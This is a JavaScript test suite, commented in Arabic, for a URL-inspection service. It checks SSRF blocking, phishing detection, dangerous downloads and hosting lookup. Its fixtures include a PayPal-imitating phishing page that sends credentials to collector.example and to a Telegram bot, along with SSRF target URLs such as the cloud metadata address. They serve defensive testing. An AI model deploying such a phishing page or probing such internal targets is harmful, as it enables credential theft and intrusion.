'use strict';

/* الزيارة الآمنة للروابط: الحماية من SSRF، كشف صفحات التصيد، الملفات، النطاقات غير الموجودة، والاستضافة. */

const test = require('node:test');
const assert = require('node:assert/strict');
const http = require('node:http');
const { createInspector, isPublicIp, analyzeHtml, countryName } = require('../server/inspect');
const { createScan } = require('../server/scan');
const { createIntel } = require('../server/intel');

// خادم محلي بصفحات مختلفة. الأسماء الوهمية (*.test) تُحلّ إلى 127.0.0.1 عبر lookup مخصص
async function withSite(routes, fn) {
    const hits = [];
    const server = http.createServer((req, res) => {
        hits.push(req.headers.host + req.url);
        const route = routes[req.url] || routes['*'];
        if (!route) { res.writeHead(404); return res.end('not found'); }
        route(req, res);
    });
    await new Promise(r => server.listen(0, '127.0.0.1', r));
    const port = server.address().port;
    try { await fn(port, hits); } finally { server.closeAllConnections(); await new Promise(r => server.close(r)); }
}

const fakeDns = map => async host => {
    if (!(host in map)) throw Object.assign(new Error('nx'), { code: 'ENOTFOUND' });
    return [{ address: map[host], family: 4 }];
};

function localInspector(port, extra = {}) {
    return createInspector({
        lookup: fakeDns({ 'shop.test': '127.0.0.1', 'paypal-secure.test': '127.0.0.1', 'files.test': '127.0.0.1', 'hop.test': '127.0.0.1', 'internal.test': '10.0.0.5', ...extra.dns }),
        resolveTxt: extra.resolveTxt || (async () => { throw new Error('no dns'); }),
        isAllowedIp: ip => ip === '127.0.0.1',
        allowedPorts: new Set([port])
    });
}

const html = (body, headers = {}) => (req, res) => { res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', ...headers }); res.end(body); };

test('isPublicIp: يرفض كل العناوين الداخلية والمحلية والمحجوزة', () => {
    for (const ip of ['127.0.0.1', '10.1.2.3', '172.16.5.5', '172.31.255.255', '192.168.1.1', '169.254.169.254', '100.64.0.1', '0.0.0.0', '224.0.0.1', '255.255.255.255', '::1', '::', 'fe80::1', 'fd00::1', 'fc00::5', '::ffff:127.0.0.1', '::ffff:10.0.0.1', '2001:db8::1', 'not-an-ip']) {
        assert.equal(isPublicIp(ip), false, ip);
    }
    for (const ip of ['8.8.8.8', '1.1.1.1', '172.32.0.1', '104.16.1.1', '2606:4700::1111', '2a00:1450:4001::200e', '::ffff:8.8.8.8']) {
        assert.equal(isPublicIp(ip), true, ip);
    }
});

test('SSRF: لا نتصل أبداً بعنوان داخلي (مباشر، أو عبر DNS، أو عبر تحويل)', async () => {
    // المحقق الحقيقي (isPublicIp): أي عنوان محلي يُرفض قبل أي اتصال
    await withSite({ '*': html('secret admin panel') }, async (port, hits) => {
        const real = createInspector({ lookup: fakeDns({ 'evil.test': '127.0.0.1' }), resolveTxt: async () => [], allowedPorts: new Set([port, 80]) });
        for (const url of [`http://127.0.0.1:${port}/`, `http://evil.test:${port}/`, 'http://169.254.169.254/latest/meta-data/', `http://[::1]:${port}/`]) {
            const r = await real.inspect(url);
            assert.equal(r.visited, false, url);
            assert.equal(r.reason, 'blocked', url);
            assert.ok(r.signals.some(s => s.type === 'danger'), url);
        }
        assert.equal(hits.length, 0, 'لم يصل أي طلب للخادم الداخلي');
    });
    // تحويل من موقع خارجي إلى عنوان داخلي: يُوقف عند التحويل
    await withSite({ '/': (req, res) => { res.writeHead(302, { Location: `http://internal.test:${req.socket.localPort}/admin` }); res.end(); } }, async port => {
        const r = await localInspector(port).inspect(`http://shop.test:${port}/`);
        assert.equal(r.reason, 'blocked');
    });
    // منفذ غير مسموح
    const r = await createInspector({ lookup: fakeDns({ 'x.test': '8.8.8.8' }) }).inspect('http://x.test:22/');
    assert.equal(r.reason, 'port');
    // نطاق غير موجود على منفذ غريب: الحكم «غير موجود» وليس «منفذ»
    const gone = await createInspector({ lookup: fakeDns({}) }).inspect('https://gone.test:8443/');
    assert.equal(gone.exists, false);
});

test('صفحة تصيد: انتحال علامة + كلمة سر + نموذج لنطاق آخر + إرسال لبوت تيليجرام', async () => {
    const page = `<!doctype html><html><head><title>PayPal: Log in to your account</title>
        <link rel="icon" href="https://www.paypalobjects.com/favicon.ico"><img src="https://www.paypal.com/logo.svg"></head>
        <body><h1>Log in</h1><form action="https://collector.example/post.php" method="post">
        <input type="email" name="login_email"><input type="password" name="pass"><button>Log In</button></form>
        <script>fetch("https://api.telegram.org/bot123:abc/sendMessage")</script></body></html>`;
    await withSite({ '/signin': html(page) }, async port => {
        const r = await localInspector(port).inspect(`http://paypal-secure.test:${port}/signin`);
        assert.equal(r.visited, true);
        assert.equal(r.page.title, 'PayPal: Log in to your account');
        assert.equal(r.page.fields.password, 1);
        assert.equal(r.page.claims, 'باي بال');
        assert.equal(r.page.exfil, true);
        assert.deepEqual(r.page.hotlinked, ['باي بال']);
        const texts = r.signals.map(s => s.text).join('\n');
        assert.match(texts, /تيليجرام/);
        assert.match(texts, /تطلب كلمة السر/);
        assert.match(texts, /يرسل بياناتك إلى نطاق ثاني \(collector\.example\)/);
        assert.match(texts, /بدون تشفير/);
        assert.ok(!('html' in r) && !JSON.stringify(r).includes('<form'), 'HTML الصفحة لا يُرجع أبداً');
    });
});

test('الزيارة ترفع حكم الفحص: رابط يبدو عادياً لكن صفحته تصيد = خطر', async () => {
    const page = `<title>مصرف الرافدين - تسجيل الدخول</title><form><input name="card_number"><input name="cvv"><input type="password"></form>`;
    await withSite({ '/': html(page) }, async port => {
        const inspector = localInspector(port);
        const scan = createScan({ config: { limits: { scanPerMinute: 30, loginWindowMs: 60000, badApiKeysPerWindow: 5 } }, users: {}, auth: {}, intel: createIntel({ enabled: false }), stats: {}, inspector });
        const plain = await scan.scanUrl(`http://shop.test:${port}/`);
        const visited = await scan.scanUrl(`http://shop.test:${port}/`, { inspect: true });
        assert.notEqual(plain.level, 'danger');
        assert.equal(visited.level, 'danger');
        assert.ok(visited.score > plain.score);
        assert.equal(visited.checks.live, true);
        assert.equal(visited.inspection.page.claims, 'مصرف الرافدين');
        assert.ok(!('signals' in visited.inspection));
    });
});

test('صفحة عادية: لا ترفع الخطورة، وتعرض العنوان ونصاً مختصراً', async () => {
    await withSite({ '/': html('<html><head><title>مطعم البيت</title></head><body><p>أهلاً بكم في مطعمنا. قائمة الطعام والأسعار.</p></body></html>') }, async port => {
        const r = await localInspector(port).inspect(`http://shop.test:${port}/`);
        assert.equal(r.page.title, 'مطعم البيت');
        assert.match(r.page.excerpt, /أهلاً بكم في مطعمنا/);
        assert.ok(r.signals.every(s => s.weight === 0));
    });
});

test('نطاق غير موجود، تحويلات، وتنزيل APK', async () => {
    const nx = await createInspector({ lookup: fakeDns({}) }).inspect('https://no-such-domain-xyz.test/');
    assert.equal(nx.exists, false);
    assert.match(nx.signals[0].text, /غير موجود/);

    await withSite({
        '/a': (req, res) => { res.writeHead(301, { Location: '/b' }); res.end(); },
        '/b': (req, res) => { res.writeHead(302, { Location: `http://files.test:${req.socket.localPort}/app.apk` }); res.end(); },
        '/app.apk': (req, res) => { res.writeHead(200, { 'Content-Type': 'application/vnd.android.package-archive' }); res.end(Buffer.alloc(2_000_000)); }
    }, async port => {
        const r = await localInspector(port).inspect(`http://hop.test:${port}/a`);
        assert.equal(r.redirects, 2);
        assert.equal(r.finalUrl, `http://files.test:${port}/app.apk`);
        assert.equal(r.download.ext, 'apk');
        assert.ok(r.signals.some(s => s.type === 'danger' && /لا تنصّبه/.test(s.text)));
    });
});

test('حلقة تحويلات لا تنتهي تتوقف، والصفحات الضخمة تُقصّ', async () => {
    await withSite({
        '/loop': (req, res) => { res.writeHead(302, { Location: '/loop' }); res.end(); },
        '/big': (req, res) => { res.writeHead(200, { 'Content-Type': 'text/html' }); res.write('<title>Big</title>'); res.end('x'.repeat(5_000_000)); }
    }, async port => {
        const inspector = localInspector(port);
        const loop = await inspector.inspect(`http://shop.test:${port}/loop`);
        assert.equal(loop.reason, 'too_many_redirects');
        const started = Date.now();
        const big = await inspector.inspect(`http://shop.test:${port}/big`);
        assert.equal(big.page.title, 'Big');
        assert.ok(Date.now() - started < 5000);
    });
});

test('الاستضافة: الدولة بالعربي، والشركة، وكشف خدمات الإخفاء (CDN)، وعدم تطابق جهة عراقية', async () => {
    const txt = async name => {
        if (name.endsWith('.origin.asn.cymru.com')) return [['13335 | 104.16.0.0/13 | NL | ripencc | 2010-07-14']];
        if (name === 'AS13335.asn.cymru.com') return [['13335 | US | arin | 2010-07-14 | CLOUDFLARENET - Cloudflare, Inc., US']];
        return [];
    };
    const inspector = createInspector({ lookup: fakeDns({}), resolveTxt: txt });
    const h = await inspector.hosting('104.16.1.1');
    assert.equal(h.asn, 13335);
    assert.equal(h.country, 'NL');
    assert.equal(h.countryName, countryName('NL'));
    assert.match(h.countryName, /هولندا/);
    assert.equal(h.cdn, true);

    const hostTxt = async name => name.endsWith('.origin.asn.cymru.com') ? [['14061 | 127.0.0.0/8 | DE | ripencc |']] : [['14061 | US | arin | | DIGITALOCEAN-ASN, US']];
    await withSite({ '/': html('<title>مصرف الرافدين</title><input type="password">') }, async port => {
        const r = await localInspector(port, { resolveTxt: hostTxt }).inspect(`http://shop.test:${port}/`);
        assert.equal(r.hosting.org, 'DIGITALOCEAN-ASN, US');
        assert.equal(r.hosting.cdn, false);
        assert.ok(r.signals.some(s => /جهة عراقية/.test(s.text) && /ألمانيا/.test(s.text)));
    });
});

test('تحليل HTML مقاوم: كيانات HTML، ترميز windows-1256، ومدخلات مخفية لا تُحسب', () => {
    const r = analyzeHtml('<title>Sign &amp; in &#x2014; Bank</title><input type="hidden" name="password"><input type="tel" name="phone"><input autocomplete="one-time-code">', new URL('https://a.example/'));
    assert.equal(r.title, 'Sign & in — Bank');
    assert.deepEqual(r.fields, { password: 0, card: 0, otp: 1, identity: 1 });
});
